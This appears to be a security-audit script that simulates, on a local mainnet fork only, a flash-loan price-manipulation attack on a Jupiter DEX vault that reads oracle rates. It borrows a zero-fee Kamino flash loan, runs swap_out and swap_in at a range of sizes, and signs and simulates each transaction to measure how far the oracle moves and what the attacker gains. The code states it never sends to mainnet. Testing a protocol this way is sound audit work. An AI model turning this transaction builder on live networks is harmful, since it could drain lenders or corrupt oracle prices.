#!/usr/bin/env node
// Fresh-attacker signed local-mainnet-fork Jupiter v92 DEX peg controls.
// Never calls sendTransaction. Synthetic attacker token inventory is counted.
const fs=require('fs'),crypto=require('crypto');
const modules='/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/audit-tools/node_modules/';
const {PublicKey,Keypair,TransactionInstruction,TransactionMessage,SystemProgram}=require(modules+'@solana/web3.js');
const {getAssociatedTokenAddressSync}=require(modules+'@solana/spl-token');
const bs58m=require(modules+'bs58'),bs58=bs58m.default||bs58m;
const {BorshAccountsCoder}=require(modules+'@coral-xyz/anchor');
const {encodeV1}=require('./klend-v1-composition.js');
const root=__dirname, fork='http://127.0.0.1:9097';
const P=x=>x instanceof PublicKey?x:new PublicKey(x);
const PROGRAM={klend:P('KLend2g3cP87fffoy8q1mQqGKjrxjC8boSyAYavgmjD'),
 dex:P('jupZ4m2GqUCJ5iueMfzQf8khFfH31d4XAQt3RzCT9Vd'),
 oracle:P('jupnw4B6Eqs7ft6rxpzYLJZYSnrpRgPcr589n5Kv4oc'),
 liquidity:P('jupeiUmn818Jg1ekPURTpr4mFo29p46vygyykFJ3wZC'),
 token:P('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
 token2022:P('TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb')};
const mint0=P('So11111111111111111111111111111111111111112');
const mint1=P('J1toso1uCk3RLmjorhTtrVwY9HJ7X8V9yYac6Y7kGCPn');
const c=JSON.parse(fs.readFileSync(`${root}/jupiter-dex-peg-path-census.json`));
const path=c.paths.find(x=>x.vaultId===92);
const zero=JSON.parse(fs.readFileSync(`${root}/klend-zero-fee-census.json`)).activeZero;
const lender=zero.find(x=>x.reserve==='EVbyPKrHG6WBfm4dLxLMJpUDY43cCAcHSpV3KYjKsktW');
const reserveCoder=new BorshAccountsCoder(JSON.parse(fs.readFileSync(
 `${root}/marginfi-source/idls-complete/kamino_lending.json`)));
let reqId=0;
async function rpc(method,params){const r=await fetch(fork,{method:'POST',headers:{'content-type':'application/json'},
 body:JSON.stringify({jsonrpc:'2.0',id:++reqId,method,params})});const x=await r.json();
 if(x.error)throw Error(`${method}: ${JSON.stringify(x.error)}`);return x.result;}
const u64=n=>{const b=Buffer.alloc(8);b.writeBigUInt64LE(BigInt(n));return b};
const u16=n=>{const b=Buffer.alloc(2);b.writeUInt16LE(n);return b};
function historyIx(tx,index){
 const msg=tx.transaction.message,all=[...msg.accountKeys,
  ...(tx.meta.loadedAddresses?.writable||[]),...(tx.meta.loadedAddresses?.readonly||[])];
 const h=msg.header,n=msg.accountKeys.length,raw=msg.instructions[index];
 const writable=i=>i<n?(i<h.numRequiredSignatures?
  i<h.numRequiredSignatures-h.numReadonlySignedAccounts:
  i<n-h.numReadonlyUnsignedAccounts):
  i<n+(tx.meta.loadedAddresses?.writable?.length||0);
 return new TransactionInstruction({programId:P(all[raw.programIdIndex]),
  keys:raw.accounts.map(i=>({pubkey:P(all[i]),isSigner:i<h.numRequiredSignatures,
   isWritable:writable(i)})),data:Buffer.from(bs58.decode(raw.data))});
}
function tokenAmount(row){if(!row?.data)return null;const raw=Buffer.from(row.data[0],'base64');
 return raw.length>=72&&[PROGRAM.token.toBase58(),PROGRAM.token2022.toBase58()]
  .includes(row.owner)?raw.readBigUInt64LE(64).toString():null}
function rate(logs){const pre=`Program return: ${PROGRAM.oracle} `;
 return (logs||[]).filter(x=>x.startsWith(pre)).map(x=>{
  const d=Buffer.from(x.slice(pre.length),'base64');let a=0n,b=0n;
  if(d.length<32)return {otherOracleReturnHex:d.toString('hex')};
  for(let i=15;i>=0;i--)a=(a<<8n)+BigInt(d[i]);
  for(let i=31;i>=16;i--)b=(b<<8n)+BigInt(d[i]);
  return {supplyX15:a.toString(),borrowX15:b.toString()};});}
function signV1(instructions,attacker,blockhash){
 const encoded=encodeV1(instructions,attacker.publicKey,blockhash);
 if(encoded.requiredSignatures!==1)throw Error('Unexpected extra signer');
 const compiled=new TransactionMessage({payerKey:attacker.publicKey,recentBlockhash:blockhash,
  instructions}).compileToV0Message();
 if(!compiled.staticAccountKeys[0].equals(attacker.publicKey))throw Error('Signer ordering changed');
 const signed=Buffer.from(encoded.wire),msg=signed.subarray(0,signed.length-64);
 const priv=crypto.createPrivateKey({key:Buffer.concat([
  Buffer.from('302e020100300506032b657004220420','hex'),
  Buffer.from(attacker.secretKey.subarray(0,32))]),format:'der',type:'pkcs8'});
 crypto.sign(null,msg,priv).copy(signed,signed.length-64);
 return {encoded,signed};
}
async function setAttackerToken(source,target,mint,authority,amount){
 const original=(await rpc('getAccountInfo',[source,{encoding:'base64',commitment:'processed'}])).value;
 if(!original)throw Error(`Template token account missing: ${source}`);
 const data=Buffer.from(original.data[0],'base64');
 if(!data.subarray(0,32).equals(mint.toBuffer()))throw Error('Token template mint mismatch');
 authority.toBuffer().copy(data,32);data.writeBigUInt64LE(amount,64);
 await rpc('surfnet_setAccount',[target.toBase58(),{data:data.toString('hex'),
  executable:false,lamports:mint.equals(mint0)?2039280:original.lamports,owner:original.owner,rentEpoch:0}]);
}
async function main(){
 const attacker=Keypair.generate();
 const ata0=getAssociatedTokenAddressSync(mint0,attacker.publicKey,false,PROGRAM.token);
 const ata1=getAssociatedTokenAddressSync(mint1,attacker.publicKey,false,PROGRAM.token);
 await rpc('surfnet_setAccount',[attacker.publicKey.toBase58(),{data:'',executable:false,
  lamports:20_000_000_000,owner:SystemProgram.programId.toBase58(),rentEpoch:0}]);
 const liqCoder=new BorshAccountsCoder(JSON.parse(fs.readFileSync('/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/jupiter-lend-current/public/idl/liquidity.json')));
 const res0=liqCoder.decode('TokenReserve',Buffer.from((await rpc('getAccountInfo',[path.tokenReserve0,{encoding:'base64'}])).value.data[0],'base64'));
 const res1=liqCoder.decode('TokenReserve',Buffer.from((await rpc('getAccountInfo',[path.tokenReserve1,{encoding:'base64'}])).value.data[0],'base64'));
 await setAttackerToken(res0.vault.toBase58(),ata0,mint0,attacker.publicKey,0n);
 await setAttackerToken(lender.supplyVault,ata1,mint1,attacker.publicKey,1_000_000_000_000n);
 const sample=JSON.parse(fs.readFileSync(`${root}/kamino-flash-history.json`)).hits[0].transaction;
 const flashBorrow=historyIx(sample,3),flashRepay=historyIx(sample,13);
 const lma=PublicKey.findProgramAddressSync([Buffer.from('lma'),P(lender.market).toBuffer()],
  PROGRAM.klend)[0];
 for(const ix of [flashBorrow,flashRepay]){
  for(const [i,x] of Object.entries({0:attacker.publicKey,1:lma,2:lender.market,
   3:lender.reserve,4:mint1,5:lender.supplyVault,6:ata1,7:lender.feeVault}))
   ix.keys[+i].pubkey=P(x);
 }
 const reserveInfo=(await rpc('getAccountInfo',[lender.reserve,{encoding:'base64',commitment:'processed'}])).value;
 const decoded=reserveCoder.decode('Reserve',Buffer.from(reserveInfo.data[0],'base64'));
 const available=BigInt(decoded.liquidity.total_available_amount.toString());
 if(decoded.config.fees.flash_loan_fee_sf.toString()!=='0')throw Error('USDC flash no longer zero fee');
 const loan=available;
 const pda=(seed,mint)=>PublicKey.findProgramAddressSync([
  Buffer.from(seed),mint.toBuffer(),path.dex?P(path.dex).toBuffer():Buffer.alloc(32)],
  PROGRAM.liquidity)[0];
 const ratePda=mint=>PublicKey.findProgramAddressSync([
  Buffer.from('rate_model'),mint.toBuffer()],PROGRAM.liquidity)[0];
 const borrow0=pda('user_borrow_position',mint0),borrow1=pda('user_borrow_position',mint1);
 const dexKeys=[attacker.publicKey,path.dex,ata0,ata1,attacker.publicKey,ata0,ata1,
  mint0,mint1,path.tokenReserve0,path.tokenReserve1,ratePda(mint0),ratePda(mint1),
  res0.vault,res1.vault,path.dexPositionToken0,path.dexPositionToken1,borrow0,borrow1,
  '7s1da8DduuBFqGra5bJBjpnvL5E9mGzCuMk1Qkh4or2Z',
  PROGRAM.liquidity,PROGRAM.token,PROGRAM.token,PROGRAM.oracle].map(P);
 const dexSpec=JSON.parse(fs.readFileSync('/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/jupiter-lend-current/public/idl/dex.json')).instructions;
 const swapSpec=dexSpec.find(x=>x.name==='swap_out');
 const mkDex=(name,amount,max)=>new TransactionInstruction({programId:PROGRAM.dex,
  keys:[...dexKeys.map((pubkey,i)=>({pubkey,isSigner:!!swapSpec.accounts[i].signer,
   isWritable:!!swapSpec.accounts[i].writable})),
   {pubkey:P('B5J1SSikiJYvpjYRcAnk7a6LCcqQigxp8tZeNTKoqNfC'),
    isSigner:false,isWritable:false},
   {pubkey:P('Jito4APyf642JPZPx3hGc6WWJ8zPKtRbRs4P815Awbb'),
    isSigner:false,isWritable:false}],
  data: name==='swap_out'?Buffer.concat([Buffer.from([206,36,149,14,163,132,148,1]),
   Buffer.from([0]),u64(amount),u64(max)]):
   Buffer.concat([Buffer.from([141,172,10,208,69,9,56,154]),
   Buffer.from([1]),u64(amount),u64(0n)])});
 const oracleIx=new TransactionInstruction({programId:PROGRAM.oracle,keys:[path.oracle,
  path.oracleSource,path.dex,path.dexPositionToken0,path.dexPositionToken1,
  path.tokenReserve0,path.tokenReserve1,path.conversionSource].map(x=>({pubkey:P(x),
  isSigner:false,isWritable:false})),data:Buffer.concat([
  Buffer.from([92,88,161,46,230,193,46,237]),u16(path.oracleNonce)])});
 const watch=[attacker.publicKey,ata0,ata1,P(lender.supplyVault),P(lender.feeVault),
  P(path.dexPositionToken0),P(path.dexPositionToken1),P(path.dex),P(path.oracle),
  P('CirunpL6HaQAARj6NneB3Nh8ukoXtJaMm8Q5itrqCtj5')];
 const labels=['attacker','attackerWSOL','attackerJitoSOL','flashSupply','flashFeeVault',
  'dexSupply0','dexSupply1','dex','oracle','largestBorrowingPosition'];
 // Import all public accounts before signed simulation. Synthetic attacker
 // accounts are never copied back to mainnet.
 const publicKeys=[...new Set([
  ...flashBorrow.keys.map(x=>x.pubkey.toBase58()),...dexKeys.map(String),
  'B5J1SSikiJYvpjYRcAnk7a6LCcqQigxp8tZeNTKoqNfC',
  'Jito4APyf642JPZPx3hGc6WWJ8zPKtRbRs4P815Awbb',
  ...oracleIx.keys.map(x=>x.pubkey.toBase58()),...watch.map(String)])]
  .filter(x=>![attacker.publicKey,ata0,ata1].some(y=>y.toBase58()===x));
 for(let i=0;i<publicKeys.length;i+=50)await rpc('getMultipleAccounts',[
  publicKeys.slice(i,i+50),{encoding:'base64',commitment:'processed'}]);
 const before=await rpc('getMultipleAccounts',[watch.map(String),
  {encoding:'base64',commitment:'processed'}]);
 const bh=(await rpc('getLatestBlockhash',[{commitment:'processed'}])).value.blockhash;
 const cases=[0n,1_000_000n,1_000_000_000n,10_000_000_000n,
  100_000_000_000n,300_000_000_000n,500_000_000_000n,
  650_000_000_000n,700_000_000_000n,705_532_125_580n,
  705_532_125_581n,705_532_125_582n,1_000_000_000_000n,
  2_000_000_000_000n,5_000_000_000_000n,6_500_000_000_000n,
  7_000_000_000_000n,10_000_000_000_000n];
 const results=[];
 for(const amount of cases){
  flashBorrow.data.writeBigUInt64LE(loan,8);
  flashRepay.data.writeBigUInt64LE(loan,8);flashRepay.data[16]=0;
  const instructions=amount===0n?[oracleIx]:[flashBorrow,mkDex('swap_out',amount,loan+5_000_000_000_000n),
   oracleIx,mkDex('swap_in',amount,0n),oracleIx,flashRepay];
  let attempt;
  try{const {encoded,signed}=signV1(instructions,attacker,bh);
   const sim=await rpc('simulateTransaction',[signed.toString('base64'),{
    encoding:'base64',sigVerify:true,replaceRecentBlockhash:false,
    commitment:'processed',innerInstructions:true,
    accounts:{encoding:'base64',addresses:watch.map(String)}}]);
   const a=sim.value.accounts||[];
   attempt={amountRaw:amount.toString(),slot:sim.context.slot,
    err:sim.value.err,bytes:encoded.sizeBytes,addresses:encoded.addressCount,
    instructions:encoded.instructionCount,requiredSignatures:encoded.requiredSignatures,
    computeUnits:sim.value.unitsConsumed,oracleReturns:rate(sim.value.logs),
    attackerUsdcPostRaw:tokenAmount(a[2]),attackerWSOLPostRaw:tokenAmount(a[1]),
    lenderPostRaw:tokenAmount(a[3]),feeVaultPostRaw:tokenAmount(a[4]),
    lastLogs:sim.value.logs?.slice(-12)};
   if(!attempt.err&&a[2])attempt.attackerUsdcDeltaRaw=(BigInt(tokenAmount(a[2]))-
    BigInt(tokenAmount(before.value[2]))).toString();
   if(!attempt.err&&a[1])attempt.attackerWSOLDeltaRaw=(BigInt(tokenAmount(a[1]))-
    BigInt(tokenAmount(before.value[1]))).toString();
   if(!attempt.err&&a[3])attempt.lenderDeltaRaw=(BigInt(tokenAmount(a[3]))-
    BigInt(tokenAmount(before.value[3]))).toString();
  }catch(e){attempt={amountRaw:amount.toString(),localError:e.stack}};
  results.push(attempt);
   console.log(JSON.stringify({amountRaw:attempt.amountRaw,err:attempt.err,
   localError:attempt.localError?.split('\n')[0],bytes:attempt.bytes,
   addresses:attempt.addresses,usdcDelta:attempt.attackerUsdcDeltaRaw,
   rates:attempt.oracleReturns,lastLogs:attempt.err?attempt.lastLogs:undefined}));
 }
 fs.writeFileSync(`${root}/jupiter-dex-v92-signed-fork.json`,JSON.stringify({
  generatedAt:new Date().toISOString(),scope:'isolated Surfpool fork with current deployed programs; no mainnet send',
  fork,attacker:attacker.publicKey.toBase58(),syntheticStartingJitoSOLraw:'1000000000000',
  syntheticStartingWSOLraw:'0',sourceTokenAccounts:[
   res0.vault.toBase58(),lender.supplyVault],
  target:{vaultId:92,oracle:path.oracle,dex:path.dex},
  lender:{reserve:lender.reserve,availableRaw:loan.toString(),flashFeeSf:'0'},
  signatureVerification:true,v1Version:1,liveSubmission:false,
  watch:watch.map((x,i)=>({label:labels[i],address:x.toBase58()})),
  before:before.value.map((x,i)=>({label:labels[i],rawAmount:tokenAmount(x),
   lamports:x?.lamports??null})),results},null,2));
}
main().catch(e=>{console.error(e.stack);process.exitCode=1});
